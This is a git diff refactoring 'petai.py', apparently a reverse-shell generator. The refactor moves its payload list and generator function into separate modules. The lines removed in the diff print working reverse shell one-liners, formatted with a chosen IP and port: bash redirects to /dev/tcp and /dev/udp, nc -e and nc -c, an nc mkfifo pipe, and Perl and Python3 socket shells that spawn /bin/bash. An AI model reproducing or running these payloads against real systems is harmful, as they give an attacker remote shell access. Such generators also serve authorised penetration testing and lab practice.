@@ -1,22 +1,16 @@
 #!/usr/bin/python3
+#Author     : Aiman
+#Date       : 16:03:2021
 
+# std lib
 import sys
 
-def reverse_shell_list():
-    print("- [Reverse Shell Type] -")
-    print("ID   |       Reverse Shell")
-    print("=====+===============================")
-    print(" 1   |       bash -i TCP")
-    print(" 2   |       bash -i UDP")
-    print(" 3   |       nc -c")
-    print(" 4   |       nc -e")
-    print(" 5   |       nc mkfifo")
-    print(" 6   |       perl")
-    print(" 7   |       python3")
-
+# custom lib
+from revshell_list import reverse_shell_list
+from revshell import reverse_shell
 
 def help_me():
-    print("Usage: petai.py [--help] [Options] [Type]")
+    print("Usage: petai.py [--help] [-r [REVERSE SHELL]] [-i [IP]] [-p [PORT]]")
     print("Exa: petai.py -r 1 -i 10.10.10.10 -p 9901")
     print("")
     print("OPTIONS:")
@@ -28,26 +22,7 @@ def help_me():
     print("--help:      show help")
     print("--list:      list all reverse shell [ID]")
 
-def reverse_shell(shell_id, user_ip, user_port):
-    if shell_id == '1':
-        print(f"bash -i >& /dev/tcp/{user_ip}/{user_port} 0>&1")
-    elif shell_id == '2':
-        print(f"bash -i >& /dev/udp/{user_ip}/{user_port} 0>&1")
-    elif shell_id == '3':
-        print(f"nc -c /bin/bash {user_ip} {user_port}")
-    elif shell_id == '4':
-        print(f"nc -e /bin/bash {user_ip} {user_port}")
-    elif shell_id == '5':
-        print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {user_ip} {user_port} >/tmp/f")
-    elif shell_id == '6':
-        print("perl -e 'use Socket;$i=" + f'"{user_ip}"' + f";$p={user_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname" + '("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' + '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");' + "};'")
-    elif shell_id == '7':
-        print("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + f'"{user_ip}",{user_port}' + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(" + '"/bin/bash"' + ")'")
-    else:
-        print("Invalid Arguments")
-
-
-if __name__ == "__main__":
+def main():
     try:
         if sys.argv[1] == "--help":     #help
             help_me()
@@ -79,4 +54,5 @@ if __name__ == "__main__":
         print("")
         print("Error: Sorry, Try This '--help'")
 
-
+if __name__ == "__main__":
+    main()
